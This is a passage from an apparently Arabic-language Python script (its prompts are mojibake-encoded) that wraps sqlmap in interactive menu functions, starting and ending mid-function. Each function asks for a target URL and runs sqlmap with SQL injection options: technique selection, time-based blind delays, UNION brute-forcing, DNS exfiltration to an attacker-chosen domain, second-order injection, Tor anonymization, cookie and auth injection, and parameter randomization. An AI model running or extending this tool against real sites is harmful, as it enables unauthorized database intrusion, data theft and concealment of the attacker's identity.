        techniques = i("╪г╪п╪о┘Д ╪з┘Д╪н╪▒┘И┘Б ╪з┘Д╪о╪з╪╡╪й ╪и╪з┘Д╪к┘В┘Ж┘К╪з╪к (┘Е╪л╪з┘Д: BEUSTQ): ")
        cmd = ["sqlmap", "-u", target_url, f"--technique={techniques}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪о╪к┘К╪з╪▒ ╪к┘В┘Ж┘К╪з╪к SQLi.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪к╪г╪о┘К╪▒ ╪з┘Д╪з╪│╪к╪м╪з╪и╪й ┘Б┘К ┘З╪м┘Е╪з╪к Blind Time-Based
def time_based_delay():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        delay = i("╪г╪п╪о┘Д ╪╣╪п╪п ╪з┘Д╪л┘И╪з┘Ж┘К ┘Д╪к╪г╪о┘К╪▒ ╪з┘Д╪з╪│╪к╪м╪з╪и╪й (╪з┘Д┘В┘К┘Е╪й ╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К╪й 5): ")
        cmd = ["sqlmap", "-u", target_url, f"--time-sec={delay}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ┘И┘В╪к ╪з┘Д╪к╪г╪о┘К╪▒.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪╣╪п╪п ╪з┘Д╪г╪╣┘Е╪п╪й ┘Б┘К ┘Б╪н╪╡ UNION
def union_columns_range():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        columns_range = i("╪г╪п╪о┘Д ┘Е╪п┘Й ╪╣╪п╪п ╪з┘Д╪г╪╣┘Е╪п╪й (┘Е╪л╪з┘Д: 1-10): ")
        cmd = ["sqlmap", "-u", target_url, f"--union-cols={columns_range}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ╪╣╪п╪п ╪г╪╣┘Е╪п╪й UNION.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪з┘Д╪н╪▒┘Б ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К brute-force ╪г╪╣┘Е╪п╪й UNION
def union_char():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        char = i("╪г╪п╪о┘Д ╪з┘Д╪н╪▒┘Б ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К brute-force (┘Е╪л╪з┘Д: A ╪г┘И x): ")
        cmd = ["sqlmap", "-u", target_url, f"--union-char={char}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪п╪о╪з┘Д ╪н╪▒┘Б brute-force.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪з┘Д╪м╪п┘И┘Д ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К ╪м┘Е┘Д╪й FROM ┘Д┘З╪м┘И┘Е UNION
def union_from_table():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        table = i("╪г╪п╪о┘Д ╪з╪│┘Е ╪з┘Д╪м╪п┘И┘Д ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К FROM (┘Е╪л╪з┘Д: users): ")
        cmd = ["sqlmap", "-u", target_url, f"--union-from={table}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ╪м╪п┘И┘Д FROM.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪п┘И┘Е┘К┘Ж ╪о╪з╪▒╪м┘К ┘Д┘З╪м┘И┘Е DNS exfiltration
def dns_exfiltration():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        domain = i("╪г╪п╪о┘Д ╪з╪│┘Е ╪з┘Д┘Ж╪╖╪з┘В ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Б┘К exfiltration (┘Е╪л╪з┘Д: yourdomain.com): ")
        cmd = ["sqlmap", "-u", target_url, f"--dns-domain={domain}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘З┘К╪ж╪й ┘З╪м┘И┘Е DNS.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪▒╪з╪и╪╖ ╪л╪з┘Ж┘К ┘Д┘Д┘Ж╪к┘К╪м╪й ┘Б┘К ┘З╪м┘И┘Е second-order
def second_order_url():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        second_url = i("╪г╪п╪о┘Д ╪▒╪з╪и╪╖ ╪з┘Д┘Ж╪к┘К╪м╪й ╪з┘Д╪л╪з┘Ж┘К (Second-order): ")
        cmd = ["sqlmap", "-u", target_url, f"--second-url={second_url}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╣╪п╪з╪п second-order URL.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н┘Е┘К┘Д ╪╖┘Д╪и HTTP ╪л╪з┘Ж┘К ┘Е┘Ж ┘Е┘Д┘Б ┘Д┘Д┘А second-order
def second_order_request_file():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        req_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪з┘Д╪╖┘Д╪и ╪з┘Д╪л╪з┘Ж┘К (┘Е╪л╪з┘Д: second.txt): ")
        cmd = ["sqlmap", "-u", target_url, f"--second-req={req_file}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н┘Е┘К┘Д ╪╖┘Д╪и second-order.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╣┘Е┘Д fingerprint ╪┤╪з┘Е┘Д
def full_fingerprint():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "-f", "--fingerprint", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╣┘Е┘Д ╪и╪╡┘Е╪й ┘Д┘Д┘Ж╪╕╪з┘Е.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪╢╪з┘Б╪й ╪о┘К╪з╪▒╪з╪к Request ┘Б┘К ╪п╪з┘Д╪й ┘И╪з╪н╪п╪й
def request_options():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б (-u): ")
        user_agent = i("╪г╪п╪о┘Д User-Agent (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        extra_header = i("╪г╪п╪о┘Д ┘З┘К╪п╪▒ ╪е╪╢╪з┘Б┘К (┘Е╪л╪з┘Д: X-Forwarded-For: 127.0.0.1) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        http_method = i("╪г╪п╪о┘Д ╪╖╪▒┘К┘В╪й HTTP (POST, GET, PUT) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ").upper()
        post_data = i("╪г╪п╪о┘Д ╪и┘К╪з┘Ж╪з╪к POST (┘Е╪л╪з┘Д: id=1) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        param_delim = i("╪г╪п╪о┘Д ╪н╪▒┘Б ╪к┘В╪│┘К┘Е ╪з┘Д╪и╪▒╪з┘Е┘К╪к╪▒ (┘Е╪л╪з┘Д: &) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")

        cmd = ["sqlmap", "-u", target_url, "--batch"]

        if user_agent.strip():
            cmd += ["--user-agent", user_agent]

        if extra_header.strip():
            cmd += ["--headers", extra_header]

        if http_method.strip():
            cmd += ["--method", http_method]

        if post_data.strip():
            cmd += ["--data", post_data]

        if param_delim.strip():
            cmd += ["--param-del", param_delim]

        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╣╪п╪з╪п ╪о┘К╪з╪▒╪з╪к ╪з┘Д╪╖┘Д╪и (Request).")
        logging.error(e)
        ai_help(str(e))
    ask_continue()


# ┘Е╪л╪з┘Д ╪п╪з┘Д╪й ╪г╪о╪▒┘Й ╪и┘Ж┘Б╪│ ╪з┘Д┘Ж╪│┘В╪М ┘Е╪л┘Д╪з┘Л ┘Д┘Д┘А fingerprint ╪з┘Д┘Г╪з┘Е┘Д:
def full_fingerprint():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "-f", "--fingerprint", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╣┘Е┘Д ╪и╪╡┘Е╪й ┘Д┘Д┘Ж╪╕╪з┘Е.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪о┘К╪з╪▒╪з╪к ┘Е╪к┘В╪п┘Е╪й ┘Д┘Д┘Г┘И┘Г┘К╪▓╪М ╪з┘Д╪и╪▒┘И┘Г╪│┘К╪М ┘И╪з┘Д┘З┘И╪│╪к ┘И╪║┘К╪▒┘З╪з ┘Б┘К sqlmap
def advanced_request_options():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")

        cookie = i("╪г╪п╪о┘Д ┘В┘К┘Е╪й ╪з┘Д┘Г┘И┘Г┘К (┘Е╪л╪з┘Д: PHPSESSID=a8d127e..) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        cookie_del = i("╪г╪п╪о┘Д ╪н╪▒┘Б ╪к┘В╪│┘К┘Е ╪з┘Д┘Г┘И┘Г┘К╪▓ (┘Е╪л╪з┘Д: ;) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        live_cookies = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪з┘Д┘Г┘И┘Г┘К╪▓ ╪з┘Д╪н┘К (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        load_cookies = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪к╪н┘Е┘К┘Д ╪з┘Д┘Г┘И┘Г┘К╪▓ (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        drop_set_cookie = ask_yes_no("╪к╪м╪з┘З┘Д Set-Cookie header╪Я")
        mobile = ask_yes_no("┘Е╪н╪з┘Г╪з╪й ┘Е┘И╪и╪з┘К┘Д User-Agent╪Я")
        random_agent = ask_yes_no("╪з╪│╪к╪о╪п╪з┘Е User-Agent ╪╣╪┤┘И╪з╪ж┘К╪Я")
        host = i("╪г╪п╪о┘Д ┘В┘К┘Е╪й Host header (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        referer = i("╪г╪п╪о┘Д ┘В┘К┘Е╪й Referer header (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        auth_type = i("╪г╪п╪о┘Д ┘Ж┘И╪╣ ╪з┘Д╪к┘И╪л┘К┘В HTTP (Basic, Digest, NTLM, PKI) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        auth_cred = i("╪г╪п╪о┘Д ╪и┘К╪з┘Ж╪з╪к ╪з┘Д╪к┘И╪л┘К┘В (name:password) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        auth_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪з┘Д╪┤┘З╪з╪п╪й/╪з┘Д┘Е┘Б╪к╪з╪н (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        ignore_code = i("╪г╪п╪о┘Д ┘Г┘И╪п ╪о╪╖╪г HTTP ┘Д╪к╪м╪з┘З┘Д┘З (┘Е╪л╪з┘Д: 401) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        ignore_proxy = ask_yes_no("╪к╪м╪з┘З┘Д ╪е╪╣╪п╪з╪п╪з╪к ╪з┘Д╪и╪▒┘И┘Г╪│┘К ╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К╪й ┘Д┘Д┘Ж╪╕╪з┘Е╪Я")
        ignore_redirects = ask_yes_no("╪к╪м╪з┘З┘Д ╪╣┘Е┘Д┘К╪з╪к ╪е╪╣╪з╪п╪й ╪з┘Д╪к┘И╪м┘К┘З╪Я")
        ignore_timeouts = ask_yes_no("╪к╪м╪з┘З┘Д ╪з┘Ж╪к┘З╪з╪б ┘Е┘З┘Д╪й ╪з┘Д╪з╪к╪╡╪з┘Д╪Я")
        proxy = i("╪г╪п╪о┘Д ╪╣┘Ж┘И╪з┘Ж ╪з┘Д╪и╪▒┘И┘Г╪│┘К (┘Е╪л╪з┘Д: http://127.0.0.1:8080) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        proxy_cred = i("╪г╪п╪о┘Д ╪и┘К╪з┘Ж╪з╪к ╪к┘И╪л┘К┘В ╪з┘Д╪и╪▒┘И┘Г╪│┘К (name:password) (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        proxy_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ┘В╪з╪ж┘Е╪й ╪з┘Д╪и╪▒┘И┘Г╪│┘К (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")
        proxy_freq = i("╪г╪п╪о┘Д ╪╣╪п╪п ╪з┘Д╪╖┘Д╪и╪з╪к ╪и┘К┘Ж ╪к╪и╪п┘К┘Д ╪з┘Д╪и╪▒┘И┘Г╪│┘К (╪г┘И ╪з╪к╪▒┘Г┘З ┘Б╪з╪▒╪║┘Л╪з): ")

        cmd = ["sqlmap", "-u", target_url, "--batch"]

        if cookie.strip():
            cmd += ["--cookie", cookie]
        if cookie_del.strip():
            cmd += ["--cookie-del", cookie_del]
        if live_cookies.strip():
            cmd += ["--live-cookies", live_cookies]
        if load_cookies.strip():
            cmd += ["--load-cookies", load_cookies]
        if drop_set_cookie:
            cmd += ["--drop-set-cookie"]
        if mobile:
            cmd += ["--mobile"]
        if random_agent:
            cmd += ["--random-agent"]
        if host.strip():
            cmd += ["--host", host]
        if referer.strip():
            cmd += ["--referer", referer]
        if auth_type.strip():
            cmd += ["--auth-type", auth_type]
        if auth_cred.strip():
            cmd += ["--auth-cred", auth_cred]
        if auth_file.strip():
            cmd += ["--auth-file", auth_file]
        if ignore_code.strip():
            cmd += ["--ignore-code", ignore_code]
        if ignore_proxy:
            cmd += ["--ignore-proxy"]
        if ignore_redirects:
            cmd += ["--ignore-redirects"]
        if ignore_timeouts:
            cmd += ["--ignore-timeouts"]
        if proxy.strip():
            cmd += ["--proxy", proxy]
        if proxy_cred.strip():
            cmd += ["--proxy-cred", proxy_cred]
        if proxy_file.strip():
            cmd += ["--proxy-file", proxy_file]
        if proxy_freq.strip():
            cmd += ["--proxy-freq", proxy_freq]

        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╣╪п╪з╪п ╪о┘К╪з╪▒╪з╪к ┘Е╪к┘В╪п┘Е╪й ┘Д┘Д╪╖┘Д╪и.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪┤╪и┘Г╪й Tor ┘Д╪е╪о┘Б╪з╪б ╪з┘Д┘З┘И┘К╪й
def use_tor():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--tor", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д ╪з╪│╪к╪о╪п╪з┘Е ╪┤╪и┘Г╪й Tor.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ┘Е┘Ж┘Б╪░ ╪и╪▒┘И┘Г╪│┘К Tor
def set_tor_port():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        tor_port = i("╪г╪п╪о┘Д ┘Е┘Ж┘Б╪░ ╪и╪▒┘И┘Г╪│┘К Tor (╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К 9050): ")
        if not tor_port.strip():
            tor_port = "9050"
        cmd = ["sqlmap", "-u", target_url, f"--tor-port={tor_port}", "--tor", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ┘Е┘Ж┘Б╪░ Tor.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ┘Ж┘И╪╣ ╪и╪▒┘И┘Г╪│┘К Tor (HTTP, SOCKS4, SOCKS5)
def set_tor_type():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        tor_type = i("╪г╪п╪о┘Д ┘Ж┘И╪╣ ╪и╪▒┘И┘Г╪│┘К Tor (HTTP, SOCKS4, SOCKS5 - ╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К SOCKS5): ")
        if tor_type.strip().upper() not in ["HTTP", "SOCKS4", "SOCKS5"]:
            tor_type = "SOCKS5"
        cmd = ["sqlmap", "-u", target_url, f"--tor-type={tor_type.upper()}", "--tor", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ┘Ж┘И╪╣ ╪и╪▒┘И┘Г╪│┘К Tor.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з┘Д╪к╪н┘В┘В ┘Е┘Ж ╪╡╪н╪й ╪з╪│╪к╪о╪п╪з┘Е Tor
def check_tor():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--check-tor", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪к╪н┘В┘В ┘Е┘Ж Tor.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪г╪о┘К╪▒ ╪и┘К┘Ж ┘Г┘Д ╪╖┘Д╪и HTTP ╪и╪з┘Д╪л┘И╪з┘Ж┘К
def set_delay():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        delay = i("╪г╪п╪о┘Д ┘Е╪п╪й ╪з┘Д╪к╪г╪о┘К╪▒ ╪и┘К┘Ж ┘Г┘Д ╪╖┘Д╪и HTTP (╪и╪з┘Д╪л┘И╪з┘Ж┘К): ")
        if not delay.strip():
            delay = "0"
        cmd = ["sqlmap", "-u", target_url, f"--delay={delay}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ╪з┘Д╪к╪г╪о┘К╪▒.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╢╪и╪╖ ┘Е┘З┘Д╪й ╪з┘Д╪з┘Ж╪к╪╕╪з╪▒ ┘В╪и┘Д ╪з┘Ж╪к┘З╪з╪б ╪з┘Д╪з╪к╪╡╪з┘Д
def set_timeout():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        timeout = i("╪г╪п╪о┘Д ┘Е┘З┘Д╪й ╪з┘Д╪з┘Ж╪к╪╕╪з╪▒ (╪и╪з┘Д╪л┘И╪з┘Ж┘К╪М ╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К 30): ")
        if not timeout.strip():
            timeout = "30"
        cmd = ["sqlmap", "-u", target_url, f"--timeout={timeout}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ┘Е┘З┘Д╪й ╪з┘Д╪з╪к╪╡╪з┘Д.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╢╪и╪╖ ╪╣╪п╪п ┘Е╪н╪з┘И┘Д╪з╪к ╪е╪╣╪з╪п╪й ╪з┘Д╪з╪к╪╡╪з┘Д ╪и╪╣╪п ╪з┘Ж╪к┘З╪з╪б ╪з┘Д┘Е┘З┘Д╪й
def set_retries():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        retries = i("╪г╪п╪о┘Д ╪╣╪п╪п ╪з┘Д┘Е╪н╪з┘И┘Д╪з╪к ╪и╪╣╪п ╪з┘Ж╪к┘З╪з╪б ╪з┘Д┘Е┘З┘Д╪й (╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К 3): ")
        if not retries.strip():
            retries = "3"
        cmd = ["sqlmap", "-u", target_url, f"--retries={retries}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ╪╣╪п╪п ╪з┘Д┘Е╪н╪з┘И┘Д╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪║┘К┘К╪▒ ╪з┘Д┘В┘К┘Е ┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ┘Е╪╣┘К┘Ж╪й ╪╣╪┤┘И╪з╪ж┘К╪з┘Л
def randomize_param():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        param = i("╪г╪п╪о┘Д ╪з╪│┘Е ╪з┘Д┘Е╪╣╪з┘Е┘Д/╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ┘Д╪к╪║┘К┘К╪▒┘З╪з ╪╣╪┤┘И╪з╪ж┘К╪з┘Л (┘Е╪л╪з┘Д: id,name): ")
        cmd = ["sqlmap", "-u", target_url, f"--randomize={param}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д╪к╪║┘К┘К╪▒ ╪з┘Д╪╣╪┤┘И╪з╪ж┘К ┘Д┘Д┘Е╪╣╪з┘Е┘Д╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪▒╪з╪и╪╖ ╪в┘Е┘Ж ┘Д┘Д╪▓┘К╪з╪▒╪й ╪з┘Д┘Е╪к┘Г╪▒╪▒╪й ╪г╪л┘Ж╪з╪б ╪з┘Д╪з╪о╪к╪и╪з╪▒
def safe_url():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        safe_url = i("╪г╪п╪о┘Д ╪╣┘Ж┘И╪з┘Ж URL ╪в┘Е┘Ж ┘Д┘Д╪▓┘К╪з╪▒╪й ╪з┘Д┘Е╪к┘Г╪▒╪▒╪й ╪г╪л┘Ж╪з╪б ╪з┘Д╪з╪о╪к╪и╪з╪▒: ")
        cmd = ["sqlmap", "-u", target_url, f"--safe-url={safe_url}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪▒╪│╪з┘Д ╪и┘К╪з┘Ж╪з╪к POST ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж
def safe_post():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        safe_post = i("╪г╪п╪о┘Д ╪и┘К╪з┘Ж╪з╪к POST ┘Д╪е╪▒╪│╪з┘Д┘З╪з ╪е┘Д┘Й ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж: ")
        cmd = ["sqlmap", "-u", target_url, f"--safe-post={safe_post}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ╪и┘К╪з┘Ж╪з╪к POST ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н┘Е┘К┘Д ╪╖┘Д╪и ╪в┘Е┘Ж ┘Е┘Ж ┘Е┘Д┘Б
def safe_req():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        safe_req_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪з┘Д╪╖┘Д╪и ╪з┘Д╪в┘Е┘Ж: ")
        cmd = ["sqlmap", "-u", target_url, f"--safe-req={safe_req_file}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н┘Е┘К┘Д ╪з┘Д╪╖┘Д╪и ╪з┘Д╪в┘Е┘Ж ┘Е┘Ж ┘Е┘Д┘Б.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪╣╪п╪п ╪з┘Д╪▓┘К╪з╪▒╪з╪к ╪з┘Д┘Е┘Ж╪к╪╕┘Е╪й ╪и┘К┘Ж ╪з┘Д╪▓┘К╪з╪▒╪з╪к ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж
def safe_freq():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        freq = i("╪г╪п╪о┘Д ╪╣╪п╪п ╪з┘Д╪▓┘К╪з╪▒╪з╪к ╪з┘Д╪╣╪з╪п┘К╪й ╪и┘К┘Ж ┘Г┘Д ╪▓┘К╪з╪▒╪й ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж: ")
        if not freq.strip():
            freq = "1"
        cmd = ["sqlmap", "-u", target_url, f"--safe-freq={freq}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╢╪и╪╖ ╪к┘Г╪▒╪з╪▒ ╪з┘Д╪▓┘К╪з╪▒╪з╪к ┘Д┘Д╪▒╪з╪и╪╖ ╪з┘Д╪в┘Е┘Ж.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪к╪▒┘Е┘К╪▓ URL ┘Д┘Д╪и┘К╪з┘Ж╪з╪к ╪з┘Д┘Е╪▒╪│┘Д╪й
def skip_urlencode():
    try:
